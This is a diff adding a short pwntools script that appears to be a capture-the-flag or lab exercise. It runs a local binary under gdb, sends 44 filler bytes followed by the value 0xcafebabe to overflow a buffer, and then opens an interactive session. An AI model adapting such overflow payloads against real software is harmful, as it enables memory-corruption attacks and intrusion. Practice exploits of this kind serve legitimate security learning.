@@ -1,0 +1,10 @@
+from pwn import *
+
+p = gdb.debug("./a.out", "b * func") 
+
+x = b"A" * 44
+x += p64(0xcafebabe) 
+
+p.sendline(x)
+
+p.interactive()
